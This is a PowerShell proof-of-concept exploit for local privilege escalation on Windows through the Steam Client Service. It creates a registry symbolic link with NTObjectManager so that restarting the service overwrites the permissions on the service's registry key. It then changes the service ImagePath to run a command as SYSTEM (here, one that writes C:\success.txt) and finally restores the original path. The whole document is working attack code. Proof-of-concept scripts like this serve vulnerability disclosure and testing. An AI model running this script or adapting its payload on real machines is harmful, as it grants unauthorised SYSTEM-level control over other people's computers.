Write-Host "[*] Installing NTObjectManager..."
install-module NTObjectManager -Scope CurrentUser -Force
import-module NTObjectManager
Write-Host "[*] Creating Registry Symbolic Link from HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc to HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service"
[NtApiDotNet.NtKey]::CreateSymbolicLink("\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\Apps\PrivEsc",$null, "\REGISTRY\Machine\SYSTEM\CurrentControlSet\Services\Steam Client Service")
Write-Host "[*] Registry Symbolic link created, restarting the Steam Client Service"
Get-Service "Steam Client Service" | Restart-Service
Write-Host "[*] Sleeping 5 seconds"
Start-Sleep 5
Write-Host "[*] DACL on HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service will be overwritten"
Write-Host "[*] Modifying the binPath on the Steam Client Service..."
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "C:\Windows\System32\cmd.exe /c echo This file has been created with system privileges > C:\success.txt"
Write-Host "[*] binPath overwritten, restarting the service to trigger EoP. This will error out, just ignore it"
Get-Service "Steam Client Service" | Restart-Service
Write-Host "[*] Done, a file called success.txt has been created on the C:\ drive"
Write-Host "[*] Attemtping to remove leftovers and restarting steam client"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service" -Name "ImagePath" -Value "`"C:\Program Files (x86)\Common Files\Steam\SteamService.exe`" /RunAsService"
Get-Service "Steam Client Service" | Restart-Service
Get-Service "Steam Client Service"
Write-Host "[*] Done"


